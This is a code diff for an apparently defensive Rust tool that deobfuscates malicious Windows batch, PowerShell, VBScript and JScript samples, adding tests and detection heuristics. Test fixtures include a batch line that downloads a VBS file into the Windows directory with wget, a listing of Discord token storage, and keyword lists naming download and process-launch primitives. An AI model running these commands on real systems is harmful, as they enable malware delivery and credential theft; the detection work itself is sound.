+        let mut env = Environment::new(&Config::default());
+        env.call_stack.push(Frame {
+            return_line: 0,
+            args: vec!["powershell.exe".into()],
+            locals_snapshot: None,
+        });
+        let out = normalize_to_string(&lex("%~$PATH:1"), &mut env);
+        assert!(
+            out.to_ascii_lowercase().ends_with(r"\powershell.exe"),
+            "got: {out}"
+        );
     }
 }
 
@@ -2293,6 +3060,135 @@ mod for_f_misc_tests {
     }
 
     #[test]
+    fn for_f_reads_common_security_inventory_output() {
+        let script = concat!(
+            "for /f \"tokens=*\" %%v in ('vol %SystemDrive% 2^>nul') do echo vol=%%v\r\n",
+            "for /f \"tokens=*\" %%t in ('tzutil /g 2^>nul') do echo tz=%%t\r\n",
+            "for /f \"tokens=*\" %%s in ('sc query WinDefend 2^>nul') do echo svc=%%s\r\n",
+            "for /f \"tokens=*\" %%f in ('netsh advfirewall show allprofiles state 2^>nul') do echo fw=%%f\r\n",
+            "for /f \"tokens=*\" %%k in ('schtasks /query /tn \"Updater\" 2^>nul') do echo task=%%k\r\n",
+            "for /f \"tokens=*\" %%e in ('wevtutil qe System /c:1 /f:text 2^>nul') do echo evt=%%e\r\n",
+            "for /f \"tokens=*\" %%g in ('net localgroup administrators 2^>nul') do echo group=%%g\r\n",
+        );
+        let report = analyze(script.as_bytes(), &Config::default());
+        assert!(
+            report.deobfuscated.contains("echo vol= Volume in drive")
+                && report
+                    .deobfuscated
+                    .contains("echo tz=Central Standard Time")
+                && report
+                    .deobfuscated
+                    .contains("echo svc=SERVICE_NAME: WinDefend")
+                && report.deobfuscated.contains("echo fw=State")
+                && report
+                    .deobfuscated
+                    .contains(r#"echo task=TaskName: \Updater"#)
+                && report.deobfuscated.contains("echo evt=Event[0]:")
+                && report
+                    .deobfuscated
+                    .contains("echo group=Alias name administrators"),
+            "deobf:\n{}\ntraits: {:?}",
+            report.deobfuscated,
+            report.traits
+        );
+        assert!(
+            !report
+                .traits
+                .iter()
+                .any(|t| matches!(t, Trait::ForUnresolvedSource { .. })),
+            "security inventory commands should resolve: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
+    fn for_f_reads_wmic_inventory_output() {
+        let script = concat!(
+            "for /f \"tokens=*\" %%d in ('wmic logicaldisk where \"Size=250954240000\" get Size') do echo disk=%%d\r\n",
+            "for /f \"tokens=*\" %%m in ('wmic computersystem get manufacturer /value') do echo maker=%%m\r\n",
+            "for /f \"tokens=*\" %%g in ('WMIC Group Where \"SID = ''S-1-5-32-544''\" Get Name /Value') do echo group=%%g\r\n",
+        );
+        let report = analyze(script.as_bytes(), &Config::default());
+        assert!(
+            report.deobfuscated.contains("echo disk=Size")
+                && report.deobfuscated.contains("echo disk=250954240000")
+                && report
+                    .deobfuscated
+                    .contains("echo maker=Manufacturer=Microsoft Corporation")
+                && report
+                    .deobfuscated
+                    .contains("echo group=Name=Administrators"),
+            "deobf:\n{}\ntraits: {:?}",
+            report.deobfuscated,
+            report.traits
+        );
+        assert!(
+            !report
+                .traits
+                .iter()
+                .any(|t| matches!(t, Trait::ForUnresolvedSource { .. })),
+            "wmic inventory commands should resolve: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
+    fn for_f_pipeline_allows_leading_stderr_redirection() {
+        let script =
+            br#"for /f "tokens=*" %%d in ('2^>NUL dir /b "%appdata%\discord\Local Storage\leveldb\"') do echo %%d"#;
+        let report = analyze(script, &Config::default());
+        assert!(
+            report.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::DirListing { path, flags }
+                        if path.contains(r"\discord\Local Storage\leveldb")
+                            && flags.iter().any(|flag| flag.eq_ignore_ascii_case("/b"))
+                )
+            }),
+            "leading stderr redirection should still allow dir synthesis: {:?}",
+            report.traits
+        );
+        assert!(
+            !report
+                .traits
+                .iter()
+                .any(|t| matches!(t, Trait::ForUnresolvedSource { pipeline } if pipeline.contains("dir /b"))),
+            "leading stderr redirection should not hide the command: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
+    fn for_f_resolves_percent_tilde_path_search_powershell() {
+        let script = concat!(
+            "call :find.powershell powershell.exe\r\n",
+            "if defined POSH (\r\n",
+            "  for /f %%d in ( '%POSH% -Command \"Get-Date -UFormat '%%H%%M%%S'\" ^<nul' ) do echo time=%%d\r\n",
+            ")\r\n",
+            "goto :EOF\r\n",
+            ":find.powershell\r\n",
+            "set \"POSH=%~$PATH:1\"\r\n",
+            "goto :EOF\r\n",
+        );
+        let report = analyze(script.as_bytes(), &Config::default());
+        assert!(
+            report.deobfuscated.contains("echo time=120000"),
+            "deobf:\n{}\ntraits: {:?}",
+            report.deobfuscated,
+            report.traits
+        );
+        assert!(
+            !report
+                .traits
+                .iter()
+                .any(|t| matches!(t, Trait::ForUnresolvedSource { pipeline } if pipeline.contains("Get-Date"))),
+            "resolved PATH powershell should run synthetic Get-Date: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
     fn for_f_pipeline_allows_echo_suppression_prefix() {
         let script = b"for /f \"tokens=*\" %%f in ('@find 2^>^&1') do echo %%f\r\n";
         let report = analyze(script, &Config::default());
@@ -2307,6 +3203,56 @@ mod for_f_misc_tests {
     }
 
     #[test]
+    fn for_f_ping_find_hostname_feeds_later_url_variable() {
+        let script = br#"for /f "tokens=1,2 delims=[]" %%A in ('ping config01.homepc.it ^| find "config01.homepc.it"') do set ipaddress=%%B
+set urlgit=http://%ipaddress%
+wget --no-check-certificate %urlgit%/win/get.vbs -O %windir%\get.vbs
+"#;
+        let report = analyze(script, &Config::default());
+        assert!(
+            !report
+                .traits
+                .iter()
+                .any(|t| matches!(t, Trait::ForUnresolvedSource { pipeline } if pipeline.contains("ping config01.homepc.it"))),
+            "ping pipeline should resolve synthetically: {:?}",
+            report.traits
+        );
+        assert!(
+            report.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::Download { src, .. }
+                        if src == "http://config01.homepc.it/win/get.vbs"
+                )
+            }),
+            "hostname from ping pipeline did not feed later URL: {:?}\ndeob:\n{}",
+            report.traits,
+            report.deobfuscated
+        );
+    }
+
+    #[test]
+    fn for_f_ping_options_still_find_target() {
+        let script =
+            br#"for /f "tokens=1,2 delims=[]" %%A in ('ping -4 -n 1 %ComputerName%') do echo %%B"#;
+        let report = analyze(script, &Config::default());
+        assert!(
+            !report
+                .traits
+                .iter()
+                .any(|t| matches!(t, Trait::ForUnresolvedSource { pipeline } if pipeline.contains("ping"))),
+            "ping options should not hide the target: {:?}",
+            report.traits
+        );
+        assert!(
+            report.deobfuscated.contains("echo MISCREANTTEARS"),
+            "ping target did not flow into bracket token: {:?}\ndeob:\n{}",
+            report.traits,
+            report.deobfuscated
+        );
+    }
+
+    #[test]
     fn for_f_pipeline_allows_repeated_noise_prefixes() {
         let script = b"for /f \"tokens=*\" %%f in ('@;@find 2^>^&1') do echo %%f\r\n";
         let report = analyze(script, &Config::default());
@@ -2316,6 +3262,28 @@ mod for_f_misc_tests {
                 .iter()
                 .any(|t| matches!(t, Trait::ForUnresolvedSource { pipeline } if pipeline.contains("find"))),
             "decorated pipeline command should not be unresolved: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
+    fn for_f_pipeline_drops_undefined_percent_noise_inside_command_name() {
+        let script = "echo token one two>tmp\r\nfor /f \"tokens=3\" %%i in ('ty%ヾ(⌐■_■)ノ%%(◕‿◕)%pe tmp') do echo value=%%i\r\n";
+        let report = analyze(script.as_bytes(), &Config::default());
+        assert!(
+            report.deobfuscated.contains("echo value=two"),
+            "obfuscated type pipeline did not feed FOR body: {:?}\ndeob:\n{}",
+            report.traits,
+            report.deobfuscated
+        );
+        assert!(
+            !report.traits.iter().any(|t| matches!(
+                t,
+                Trait::ForUnresolvedSource { pipeline }
+                    if pipeline.contains("ty")
+                        && pipeline.contains("pe tmp")
+            )),
+            "undefined percent-noise pipeline should not be unresolved: {:?}",
             report.traits
         );
     }
@@ -2613,6 +3581,20 @@ mod start_title_tests {
         });
         assert!(has, "start title broke chain: {:?}", report.traits);
     }
+
+    #[test]
+    fn start_quoted_title_alone_is_not_interpreted_as_command() {
+        let script = b"start \"mshta.exe\"\r\n";
+        let report = analyze(script, &Config::default());
+        assert!(
+            !report
+                .traits
+                .iter()
+                .any(|t| matches!(t, Trait::Mshta { .. })),
+            "start title was interpreted as mshta command: {:?}",
+            report.traits
+        );
+    }
 }
 
 pub use env::{Config, Environment, WinVer};
@@ -2626,6 +3608,8 @@ pub struct Report {
     pub extracted_cmd: Vec<String>,
     pub extracted_ps1: Vec<Vec<u8>>,
     pub extracted_ps1_normalized: Vec<String>,
+    pub extracted_jscript: Vec<Vec<u8>>,
+    pub extracted_vbs: Vec<Vec<u8>>,
     /// Recovered PE blobs from AES-chain droppers, paired with a short
     /// human-readable label (e.g. `"ps-aes-stage1-asm0"`). The CLI's
     /// `write_report_files` writes each as `<sha>.<ext>` so analysts
@@ -2640,6 +3624,11 @@ pub struct Report {
 // would never reach trait extraction. Pre-scan and push any script block
 // payload onto `all_extracted_jscript` so `scan_js_payloads` walks it.
 fn pre_scan_polyglot_script_block(input: &[u8], env: &mut Environment) {
+    if !contains_ascii_case_insensitive_bytes(input, b"<script")
+        || !contains_ascii_case_insensitive_bytes(input, b"</script>")
+    {
+        return;
+    }
     let text = String::from_utf8_lossy(input);
     let lower = text.to_ascii_lowercase();
     let mut idx = 0usize;
@@ -2657,48 +3646,280 @@ fn pre_scan_polyglot_script_block(input: &[u8], env: &mut Environment) {
         let body_end = body_start + close_rel;
         let body = &text[body_start..body_end];
         if !body.trim().is_empty() {
-            env.all_extracted_jscript.push(body.as_bytes().to_vec());
+            let tag = &lower[abs_open..abs_open + tag_end_rel + 1];
+            let body_lower = body.to_ascii_lowercase();
+            let payload = body.as_bytes().to_vec();
+            if tag.contains("jscript") || tag.contains("javascript") {
+                push_unique_payload(&mut env.all_extracted_jscript, payload);
+            } else if tag.contains("vbscript") || looks_like_vbs_script(&body_lower) {
+                push_unique_payload(&mut env.all_extracted_vbs, payload);
+            } else {
+                push_unique_payload(&mut env.all_extracted_jscript, payload);
+            }
         }
         idx = body_end + "</script>".len();
     }
 }
 
-fn pre_scan_utf16_script_blob(decoded: &str, env: &mut Environment) {
-    let lower = decoded.to_ascii_lowercase();
-    let looks_vbs = lower.contains("createobject")
+fn contains_ascii_case_insensitive_bytes(haystack: &[u8], needle: &[u8]) -> bool {
+    needle.is_empty()
+        || (haystack.len() >= needle.len()
+            && haystack
+                .windows(needle.len())
+                .any(|window| window.eq_ignore_ascii_case(needle)))
+}
+
+fn push_unique_payload(payloads: &mut Vec<Vec<u8>>, payload: Vec<u8>) {
+    if !payloads.iter().any(|existing| existing == &payload) {
+        payloads.push(payload);
+    }
+}
+
+fn looks_like_vbs_script(lower: &str) -> bool {
+    lower.contains("createobject")
         || lower.contains("wscript")
         || lower.contains("xmlhttp")
+        || lower.contains("winmgmts")
+        || (lower.contains("getobject") && lower.contains("script:"))
+        || lower.contains("response.redirect")
+        || lower.contains("commandlineeventconsumer")
+        || looks_like_office_vbs_startup_save(lower)
         || lower.contains("private function")
         || lower.contains("option explicit")
         || lower.contains("\ndim ")
-        || lower.starts_with("dim ");
-    let looks_js = lower.contains("activexobject")
+        || lower.starts_with("dim ")
+        || lower.contains("\nsub ")
+        || lower.starts_with("sub ")
+        || lower.contains("\npublic sub ")
+        || lower.starts_with("public sub ")
+        || lower.contains("\nprivate sub ")
+        || lower.starts_with("private sub ")
+        || lower.contains("\npublic function ")
+        || lower.starts_with("public function ")
+        || (lower.contains("\nfunction ") || lower.starts_with("function "))
+            && lower.contains("end function")
+        || (lower.contains("\nclass ") || lower.starts_with("class "))
+            && lower.contains("end class")
+}
+
+fn looks_like_js_script(lower: &str) -> bool {
+    lower.contains("activexobject")
         || lower.contains("<script")
         || lower.contains("document.")
         || lower.contains("window.")
         || lower.contains("function ")
         || lower.contains("var ")
-        || lower.contains("eval(");
+        || lower.contains("eval(")
+}
 
-    if looks_vbs {
-        let payload = decoded.as_bytes().to_vec();
-        if !env
-            .all_extracted_vbs
-            .iter()
-            .any(|existing| existing == &payload)
-        {
-            env.all_extracted_vbs.push(payload);
-        }
+fn first_meaningful_script_line(lower: &str) -> &str {
+    lower
+        .trim_start_matches('\u{feff}')
+        .lines()
+        .map(str::trim_start)
+        .find(|line| {
+            let trimmed = line.trim();
+            !trimmed.is_empty()
+                && !trimmed.starts_with('\'')
+                && !trimmed.starts_with("//")
+                && !trimmed.starts_with("/*")
+        })
+        .unwrap_or("")
+}
+
+fn starts_like_standalone_vbs(lower: &str) -> bool {
+    let first = first_meaningful_script_line(lower);
+    first.starts_with("dim ")
+        || (first.starts_with("const ") && !looks_like_js_script(lower))
+        || looks_like_vbs_execute_assignment_prefix(first, lower)
+        || (first.starts_with("set ") && first.contains("createobject"))
+        || (first.starts_with("set ") && first.contains("getobject") && first.contains("winmgmts"))
+        || (first.starts_with("getobject") && first.contains("script:"))
+        || first.starts_with("response.redirect")
+        || (first.starts_with("with ") && first.contains("createobject"))
+        || first.starts_with("createobject(")
+        || first.starts_with("createobject (")
+        || ((first.starts_with("execute ")
+            || first.starts_with("execute(")
+            || first.starts_with("executeglobal ")
+            || first.starts_with("executeglobal("))
+            && first.contains("createobject"))
+        || first.starts_with("option explicit")
+        || first.starts_with("private function")
+        || first.starts_with("on error ")
+        || first.starts_with("sub ")
+        || first.starts_with("public sub ")
+        || first.starts_with("private sub ")
+        || first.starts_with("public function ")
+        || (first.starts_with("function ") && lower.contains("end function"))
+        || (first.starts_with("class ") && lower.contains("end class"))
+        || (first.starts_with("if ") && looks_like_office_vbs_startup_save(lower))
+}
+
+fn looks_like_vbs_execute_assignment_prefix(first: &str, lower: &str) -> bool {
+    if looks_like_js_script(lower) || !lower.contains("createobject") {
+        return false;
     }
-    if looks_js {
-        let payload = decoded.as_bytes().to_vec();
-        if !env
-            .all_extracted_jscript
-            .iter()
-            .any(|existing| existing == &payload)
-        {
-            env.all_extracted_jscript.push(payload);
+    if !lower.contains("execute") {
+        return false;
+    }
+    let Some((lhs, _rhs)) = first.split_once('=') else {
+        return false;
+    };
+    let lhs = lhs.trim();
+    if lhs.is_empty() {
+        return false;
+    }
+    lhs.bytes().all(|b| b.is_ascii_alphanumeric() || b == b'_')
+        && lhs
+            .as_bytes()
+            .first()
+            .is_some_and(|b| b.is_ascii_alphabetic() || *b == b'_')
+}
+
+fn pre_scan_standalone_script_input(input: &[u8], env: &mut Environment) -> bool {
+    let has_vbs_atom = [
+        b"createobject" as &[u8],
+        b"wscript",
+        b"xmlhttp",
+        b"winmgmts",
+        b"win32_process",
+        b"script:",
+        b"binarygeturl",
+        b"followhyperlink",
+        b"navigate",
+        b"response.redirect",
+        b"option explicit",
+        b"application.startuppath",
+        b"executeexcel4macro",
+        b"urldownloadtofile",
+    ]
+    .iter()
+    .any(|needle| contains_ascii_case_insensitive_bytes(input, needle));
+    if !has_vbs_atom {
+        return false;
+    }
+
+    let text = String::from_utf8_lossy(input);
+    let lower = text.to_ascii_lowercase();
+    if !starts_like_standalone_vbs(&lower) {
+        return false;
+    }
+    if has_vbs_atom && looks_like_vbs_script(&lower) {
+        push_unique_payload(&mut env.all_extracted_vbs, text.as_bytes().to_vec());
+        return true;
+    }
+    false
+}
+
+fn looks_like_office_vbs_startup_save(lower: &str) -> bool {
+    lower.contains("application.startuppath")
+        && lower.contains("workbooks(")
+        && lower.contains(".saveas")
+}
+
+fn pre_scan_standalone_powershell_input(input: &[u8], env: &mut Environment) -> bool {
+    let text = String::from_utf8_lossy(input);
+    let lower = text.to_ascii_lowercase();
+    if !starts_like_standalone_powershell(&lower) {
+        return false;
+    }
+
+    let mut queued = false;
+    for body in scriptblock_create_string_literals(&text) {
+        push_unique_payload(&mut env.all_extracted_ps1, body.into_bytes());
+        queued = true;
+    }
+
+    if looks_like_powershell_payload_bytes(input) {
+        push_unique_payload(&mut env.all_extracted_ps1, text.as_bytes().to_vec());
+        queued = true;
+    }
+    queued
+}
+
+fn starts_like_standalone_powershell(lower: &str) -> bool {
+    let first = first_meaningful_script_line(lower);
+    first.starts_with('$')
+        || first.starts_with("param(")
+        || first.starts_with("param ")
+        || first.starts_with("function ")
+        || first.starts_with("[scriptblock]::create")
+        || first.starts_with("&([scriptblock]::create")
+        || first.starts_with("& ([scriptblock]::create")
+        || first.starts_with("iex ")
+        || first.starts_with("iex(")
+        || first.starts_with("invoke-expression")
+        || first.starts_with("invoke-webrequest")
+        || first.starts_with("invoke-restmethod")
+}
+
+fn scriptblock_create_string_literals(text: &str) -> Vec<String> {
+    let lower = text.to_ascii_lowercase();
+    let mut out = Vec::new();
+    let mut search_from = 0usize;
+    while let Some(rel) = lower[search_from..].find("[scriptblock]::create") {
+        let start = search_from + rel;
+        let Some(open_rel) = lower[start..].find('(') else {
+            break;
+        };
+        let mut pos = start + open_rel + 1;
+        pos = skip_ascii_ws(text, pos);
+        let Some((body, end)) = parse_ps_string_literal_at(text, pos) else {
+            search_from = pos;
+            continue;
+        };
+        if !body.trim().is_empty() {
+            out.push(body);
         }
+        search_from = end;
+    }
+    out
+}
+
+fn skip_ascii_ws(text: &str, mut pos: usize) -> usize {
+    while let Some(byte) = text.as_bytes().get(pos) {
+        if !byte.is_ascii_whitespace() {
+            break;
+        }
+        pos += 1;
+    }
+    pos
+}
+
+fn parse_ps_string_literal_at(text: &str, pos: usize) -> Option<(String, usize)> {
+    let quote = *text.as_bytes().get(pos)?;
+    if quote != b'\'' && quote != b'"' {
+        return None;
+    }
+    let mut out = String::new();
+    let mut i = pos + 1;
+    while i < text.len() {
+        let b = text.as_bytes()[i];
+        if b == quote {
+            if text.as_bytes().get(i + 1) == Some(&quote) {
+                out.push(quote as char);
+                i += 2;
+                continue;
+            }
+            return Some((out, i + 1));
+        }
+        let ch = text[i..].chars().next()?;
+        out.push(ch);
+        i += ch.len_utf8();
+    }
+    None
+}
+
+fn pre_scan_utf16_script_blob(decoded: &str, env: &mut Environment) {
+    let lower = decoded.to_ascii_lowercase();
+    if looks_like_vbs_script(&lower) {
+        let payload = decoded.as_bytes().to_vec();
+        push_unique_payload(&mut env.all_extracted_vbs, payload);
+    }
+    if looks_like_js_script(&lower) {
+        let payload = decoded.as_bytes().to_vec();
+        push_unique_payload(&mut env.all_extracted_jscript, payload);
     }
 }
 
@@ -2737,9 +3958,24 @@ fn decode_utf16le_script_blob(input: &[u8]) -> Option<String> {
     }
 }
 
+fn decode_utf16le_extracted_payload(input: &[u8]) -> Option<String> {
+    const MAX_UTF16_DECODE_BYTES: usize = 16 * 1024 * 1024;
+    if input.len() > MAX_UTF16_DECODE_BYTES || !looks_like_utf16le(input) {
+        return None;
+    }
+    let u16s: Vec<u16> = input
+        .chunks_exact(2)
+        .map(|b| u16::from_le_bytes([b[0], b[1]]))
+        .collect();
+    Some(String::from_utf16_lossy(&u16s))
+}
+
 fn looks_like_utf16le(bytes: &[u8]) -> bool {
     if bytes.len() < 4 {
         return false;
+    }
+    if bytes.starts_with(&[0xff, 0xfe]) {
+        return true;
     }
     let pairs = bytes.len() / 2;
     let even_nonzero = bytes.iter().step_by(2).filter(|b| **b != 0).count();
@@ -2779,9 +4015,77 @@ fn looks_like_utf16le(bytes: &[u8]) -> bool {
 /// # Returns
 ///
 /// A [`Report`] with the deobfuscated text, typed traits (IOCs +
-/// structural signals + caps), and extracted child cmd/ps1 payloads
+/// structural signals + caps), and extracted child cmd/ps1/js/vbs payloads
 /// (raw bytes plus a normalized form for the ps1 cases).
 pub fn analyze(input: &[u8], cfg: &Config) -> Report {
+    analyze_inner(input, cfg, None)
+}
+
+/// Analyze a sample while also providing its original filesystem path.
+///
+/// This lets `%~f0`/`%~n0`/`%~nx0` style self references resolve to the
+/// caller's real input name for self-extracting chains.
+pub fn analyze_with_path(
+    input: &[u8],
+    cfg: &Config,
+    file_path: impl AsRef<std::path::Path>,
+) -> Report {
+    analyze_inner(input, cfg, Some(file_path.as_ref().to_path_buf()))
+}
+
+fn normalize_extracted_ps1_payloads(
+    payloads: &[Vec<u8>],
+    normalized_cache: &std::collections::HashMap<Vec<u8>, String>,
+) -> Vec<String> {
+    if payloads.len() <= 1 {
+        return payloads
+            .iter()
+            .map(|bytes| {
+                normalized_cache
+                    .get(bytes.as_slice())
+                    .cloned()
+                    .unwrap_or_else(|| ps1_scan::normalize_ps1_payload(bytes))
+            })
+            .collect();
+    }
+
+    let mut normalized = Vec::with_capacity(payloads.len());
+    let mut cache: std::collections::HashMap<&[u8], String> =
+        std::collections::HashMap::with_capacity(payloads.len());
+    for bytes in payloads {
+        let key = bytes.as_slice();
+        if let Some(cached) = normalized_cache.get(key) {
+            normalized.push(cached.clone());
+            continue;
+        }
+        if let Some(cached) = cache.get(key) {
+            normalized.push(cached.clone());
+            continue;
+        }
+        let value = ps1_scan::normalize_ps1_payload(key);
+        cache.insert(key, value.clone());
+        normalized.push(value);
+    }
+    normalized
+}
+
+fn normalized_payload_has_url_missing_from_out(payload: &str, out: &str) -> bool {
+    payload
+        .split(|ch: char| {
+            ch.is_whitespace()
+                || matches!(
+                    ch,
+                    '"' | '\'' | '`' | ';' | ',' | '<' | '>' | '(' | ')' | '[' | ']' | '{' | '}'
+                )
+        })
+        .filter(|token| {
+            token.contains("http://") || token.contains("https://") || token.contains("ftp://")
+        })
+        .filter_map(deob_scan::normalize_liberal_url_token)
+        .any(|url| !out.contains(&url))
+}
+
+fn analyze_inner(input: &[u8], cfg: &Config, file_path: Option<std::path::PathBuf>) -> Report {
     let profile_enabled = std::env::var_os("HARRINGTON_PROFILE").is_some();
     let profile_start = std::time::Instant::now();
     let mut profile_last = profile_start;
@@ -2800,52 +4104,71 @@ pub fn analyze(input: &[u8], cfg: &Config) -> Report {
         };
     }
     let mut env = Environment::new(cfg);
+    env.file_path = file_path;
+    let input_truncated = input_has_truncation_marker(input);
+    if input_truncated {
+        env.traits.push(Trait::LineTruncated {
+            original_len: input.len() as u64,
+        });
+        if let Some(metadata) = truncated_high_unicode_payload_metadata(input) {
+            env.traits.push(Trait::HighUnicodePayload {
+                char_count: metadata.char_count,
+                truncated: true,
+                byte_carrier_base: metadata.byte_carrier_base,
+                byte_count: metadata.byte_count,
+            });
+        }
+    }
     if cfg.self_extract {
         env.input_bytes = Some(std::sync::Arc::from(input));
     }
     let mut out = String::new();
-    // FE-DOSfuscation pattern: scripts that reference `!VAR!` without an
-    // explicit `setlocal enabledelayedexpansion` are almost certainly meant
-    // to run under `cmd /v:on` (the FireEye DOSfuscation report's
-    // test_echo_pipe / test_call_var cases match this). 173/1187 corpus
-    // .bat samples use this pattern; refusing to expand `!X!` leaves
-    // their IOCs literally bracketed in `!`. Auto-enable delayed
-    // expansion when at least one `!IDENT!` reference exists and the
-    // script doesn't explicitly DISABLE it. Real `setlocal
-    // enabledelayedexpansion` / `cmd /v:on` codepaths re-set this same
-    // flag, so this only matters when both are missing.
-    if has_bang_var_reference(input) && !has_disable_delayed_expansion(input) {
-        env.delayed_expansion = true;
-    }
-    pre_scan_polyglot_script_block(input, &mut env);
-    deob_scan::scan_raw_marker_powershell_urls(input, &mut env);
-    profile_mark!("setup_and_prescan");
-    if looks_like_pe(input) {
-        env.traits.push(Trait::DisguisedBinary {
-            format: "pe".to_string(),
-            size: input.len() as u64,
-        });
-        env.recovered_pe
-            .push(("disguised-pe-input".to_string(), input.to_vec()));
-        scan_binary_input_urls(input, &mut env);
-        profile_mark!("binary_input");
-    } else if let Some(fmt) = detect_disguised_binary(input) {
-        // Non-PE binary formats masquerading as `.bat`/`.cmd`/`.ps1`
-        // (CAB / ZIP / RAR / 7z / LNK / PDF / image). Persist the bytes
-        // so analysts can pull the real file out — same dump mechanism
-        // as the AES-recovered PE blobs.
+    let disguised_binary_format = if looks_like_pe(input) {
+        Some("pe")
+    } else {
+        detect_disguised_binary(input)
+    };
+    if let Some(fmt) = disguised_binary_format {
         env.traits.push(Trait::DisguisedBinary {
             format: fmt.to_string(),
             size: input.len() as u64,
         });
-        env.recovered_pe
-            .push((format!("disguised-{fmt}-input"), input.to_vec()));
+        env.recovered_pe.push((
+            if fmt == "pe" {
+                "disguised-pe-input".to_string()
+            } else {
+                format!("disguised-{fmt}-input")
+            },
+            input.to_vec(),
+        ));
+        profile_mark!("setup_and_prescan");
         scan_binary_input_urls(input, &mut env);
         profile_mark!("binary_input");
     } else {
+        // FE-DOSfuscation pattern: scripts that reference `!VAR!` without an
+        // explicit `setlocal enabledelayedexpansion` are almost certainly meant
+        // to run under `cmd /v:on` (the FireEye DOSfuscation report's
+        // test_echo_pipe / test_call_var cases match this). 173/1187 corpus
+        // .bat samples use this pattern; refusing to expand `!X!` leaves
+        // their IOCs literally bracketed in `!`. Auto-enable delayed
+        // expansion when at least one `!IDENT!` reference exists and the
+        // script doesn't explicitly DISABLE it. Real `setlocal
+        // enabledelayedexpansion` / `cmd /v:on` codepaths re-set this same
+        // flag, so this only matters when both are missing.
+        if has_bang_var_reference(input) && !has_disable_delayed_expansion(input) {
+            env.delayed_expansion = true;
+        }
+        pre_scan_polyglot_script_block(input, &mut env);
+        let standalone_vbs_input = pre_scan_standalone_script_input(input, &mut env);
+        let standalone_ps_input = pre_scan_standalone_powershell_input(input, &mut env);
+        let standalone_script_input = standalone_vbs_input || standalone_ps_input;
+        deob_scan::scan_raw_marker_powershell_urls(input, &mut env);
+        profile_mark!("setup_and_prescan");
         if let Some(decoded) = decode_utf16le_script_blob(input) {
             pre_scan_utf16_script_blob(&decoded, &mut env);
             out = decoded;
+        } else if standalone_script_input {
+            out = String::from_utf8_lossy(input).into_owned();
         } else {
             drive(input, &mut env, &mut out);
         }
@@ -2858,6 +4181,8 @@ pub fn analyze(input: &[u8], cfg: &Config) -> Report {
         profile_mark!("summarize_binary_noise");
         out = summarize_nul_padding_lines(&out, &mut env);
         profile_mark!("summarize_nul_padding");
+        out = summarize_high_unicode_carrier_lines(&out, &mut env);
+        profile_mark!("summarize_high_unicode_carriers");
         let raw_text = String::from_utf8_lossy(input);
         let raw_text_for_embedded = {
             let mut scratch = env.clone();
@@ -2875,19 +4200,30 @@ pub fn analyze(input: &[u8], cfg: &Config) -> Report {
             ps1_scan::extract_self_embedded_ps1(&mut env, &out);
         }
         out = summarize_self_tail_base64_payloads(&out, &mut env);
+        out = summarize_encoded_set_carrier_line_runs(&out, &mut env);
         profile_mark!("self_embedded_ps1");
         if !env.check_deadline() {
             ps1_scan::scan_ps1_payloads(&mut env);
         }
         profile_mark!("ps1_scan");
+        let ps1_count_before_vbs = env.all_extracted_ps1.len();
         if !env.check_deadline() {
             vbs_scan::scan_vbs_payloads(&mut env);
         }
         profile_mark!("vbs_scan");
+        if !env.check_deadline() && env.all_extracted_ps1.len() > ps1_count_before_vbs {
+            ps1_scan::scan_ps1_payloads(&mut env);
+        }
+        profile_mark!("vbs_ps1_scan");
+        let ps1_count_before_js = env.all_extracted_ps1.len();
         if !env.check_deadline() {
             js_scan::scan_js_payloads(&mut env);
         }
         profile_mark!("js_scan");
+        if !env.check_deadline() && env.all_extracted_ps1.len() > ps1_count_before_js {
+            ps1_scan::scan_ps1_payloads(&mut env);
+        }
+        profile_mark!("js_ps1_scan");
         if !env.check_deadline() {
             ps1_scan::scan_inline_powershell_text(&out, &mut env);
         }
@@ -2901,7 +4237,9 @@ pub fn analyze(input: &[u8], cfg: &Config) -> Report {
         // PS body that hosts the `function Musculos…` definition
         // (订单列表.bat is 4 KB on one line but the deob is ~2 KB with
         // the body split). Run it again over the raw input so the
-        // call sites are intact.
+        // call sites are intact. Keep this out of the generic
+        // scan_deob_text loop; full-corpus parity showed the raw-source
+        // pass covers the family while avoiding duplicate regex work.
         if !env.check_deadline() {
             deob_scan::scan_ps_char_index_extractor_urls(&raw_text, &mut env);
         }
@@ -2964,9 +4302,9 @@ pub fn analyze(input: &[u8], cfg: &Config) -> Report {
     // contains CMD code; an `objShell.Run('\\\\host@SSL\\DavWWWRoot\\...')`
     // inside a `<script>` block (polyglot .bat) never reaches `out` so we
     // scan the raw payload bodies directly.
-    let jscript_bodies: Vec<Vec<u8>> = env.all_extracted_jscript.clone();
-    let vbs_bodies: Vec<Vec<u8>> = env.all_extracted_vbs.clone();
-    let ps1_bodies: Vec<Vec<u8>> = env.all_extracted_ps1.clone();
+    let mut jscript_bodies = std::mem::take(&mut env.all_extracted_jscript);
+    let mut vbs_bodies = std::mem::take(&mut env.all_extracted_vbs);
+    let mut ps1_bodies = std::mem::take(&mut env.all_extracted_ps1);
     for body in jscript_bodies
         .iter()
         .chain(vbs_bodies.iter())
@@ -2978,7 +4316,15 @@ pub fn analyze(input: &[u8], cfg: &Config) -> Report {
         let text = String::from_utf8_lossy(body);
         deob_scan::scan_unc_webdav(&text, &mut env);
     }
+    jscript_bodies.append(&mut env.all_extracted_jscript);
+    env.all_extracted_jscript = jscript_bodies;
+    vbs_bodies.append(&mut env.all_extracted_vbs);
+    env.all_extracted_vbs = vbs_bodies;
+    ps1_bodies.append(&mut env.all_extracted_ps1);
+    env.all_extracted_ps1 = ps1_bodies;
     profile_mark!("payload_unc_webdav");
+    resolve_rundll32_download_urls(&mut env.traits);
+    profile_mark!("resolve_rundll32_download_urls");
     // Filter out Download traits whose `src` URL is noise (unresolved
     // `%%X` loop vars, `%foo%` undefined refs, bad IPs, well-known scrape
     // hosts). Several handlers (cmd.rs, curl.rs) push Trait::Download
@@ -2998,12 +4344,51 @@ pub fn analyze(input: &[u8], cfg: &Config) -> Report {
     });
     dedup_traits(&mut env.traits, cfg.max_traits_per_kind);
     profile_mark!("filter_and_dedup");
-    let extracted_ps1_normalized: Vec<String> = env
+    let extracted_ps1_normalized =
+        normalize_extracted_ps1_payloads(&env.all_extracted_ps1, &env.ps1_normalized_cache);
